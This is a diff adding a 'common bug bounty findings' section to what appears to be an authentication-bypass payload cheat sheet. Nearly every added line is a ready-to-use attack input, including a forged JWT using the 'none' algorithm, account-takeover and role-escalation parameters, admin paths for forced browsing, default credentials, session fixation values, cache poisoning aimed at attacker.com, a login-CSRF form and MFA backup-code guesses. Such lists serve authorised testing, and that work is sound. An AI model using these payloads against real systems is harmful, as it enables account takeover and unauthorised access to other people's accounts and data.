@@ -312,3 +312,142 @@ verified=false&verified=true
 # Skip step 2 in multi-step authentication
 # Reuse old session tokens
 # Replay old authentication requests
+
+# ============================================
+# COMMON BUG BOUNTY FINDINGS
+# ============================================
+
+# JWT "none" algorithm bypass
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
+alg: none
+
+# JWT weak secret brute force
+# Try common secrets: secret, password, 123456, jwt, key
+
+# Account takeover via email change
+email=victim@example.com&new_email=attacker@example.com
+# Then reset password using attacker's email
+
+# Broken access control via UUID manipulation
+user_id=550e8400-e29b-41d4-a716-446655440000
+# Try sequential or predictable UUIDs
+
+# Authentication bypass via forced browsing
+/admin/dashboard
+/api/v1/admin/users
+/internal/admin
+/console
+/actuator
+/swagger-ui.html
+/debug
+
+# User enumeration via timing attacks
+username=existing_user (slower response)
+username=nonexistent (faster response)
+
+# Password policy bypass
+password=Pass123!@#$%^&*()_+{}[]|:;<>,.?/~`
+# Very long password that might bypass length checks
+password=AAAAA....(10000 chars)
+
+# Multi-account linking exploitation
+link_account=victim@example.com
+oauth_connect=victim_account_id
+
+# Session fixation via URL
+?PHPSESSID=attacker_session_id
+?session=attacker_controlled_value
+?token=known_token
+
+# Authentication via social login manipulation
+oauth_id=victim_oauth_id
+provider=google&user_id=victim_id
+
+# Register with existing email via race condition
+# Send 10 simultaneous registration requests with same email
+
+# Account takeover via referral code
+referral_code=victim_referral
+invite_code=admin_invite
+
+# Authentication bypass via API version manipulation
+/api/v1/login (with strict auth)
+/api/v0/login (might have weak auth)
+/api/beta/login
+/api/internal/login
+
+# Backup authentication endpoints
+/login.php.bak
+/auth.php~
+/login.php.old
+/authentication.php.backup
+
+# Default development credentials
+username=dev&password=dev
+username=developer&password=developer123
+username=staging&password=staging123
+username=debug&password=debug
+
+# Privilege escalation via user role manipulation
+role=user&role=admin
+user_type=regular&user_type=administrator
+is_privileged=false&is_privileged=true
+access_level=1&access_level=99
+
+# Account takeover via subdomain takeover
+# If auth uses subdomain cookies, takeover auth.example.com
+
+# Bypass via file upload to authentication directory
+# Upload .htaccess to disable authentication
+# Upload web shell to /admin/.htaccess
+
+# Authentication bypass via cache poisoning
+X-Forwarded-Host: attacker.com
+# Cache the response and serve to all users
+
+# Login CSRF to force login as attacker
+<form action="https://victim.com/login" method="POST">
+  <input name="username" value="attacker">
+  <input name="password" value="attacker_password">
+</form>
+
+# Insecure direct object reference in auth
+/auth/verify/USER_ID_1
+/auth/verify/USER_ID_2
+/auth/activate/TOKEN_1
+
+# Authentication via header injection
+Cookie: authenticated=true; admin=true
+Cookie: PHPSESSID=admin_session; role=administrator
+
+# Time-based authentication bypass
+# Set system time to future/past to bypass token expiration
+timestamp=9999999999
+valid_until=2099-01-01
+expires=253402300799
+
+# Biometric authentication bypass
+# Send empty biometric data
+fingerprint=
+face_id=null
+biometric_token=
+
+# MFA bypass via backup codes
+backup_code=000000
+recovery_code=111111
+emergency_code=123456
+
+# Authentication via registration endpoint abuse
+/register?username=admin&password=new_pass&force=true
+/signup?email=admin@example.com&override=true
+
+# Subdomain authentication inheritance
+# Login at login.example.com transfers to admin.example.com
+
+# Cross-site authentication via postMessage
+postMessage({type:'auth',token:'admin_token'}, '*')
+
+# Authentication bypass via request method override
+X-HTTP-Method-Override: GET
+X-Method-Override: GET
+# Change POST to GET to bypass CSRF and auth checks
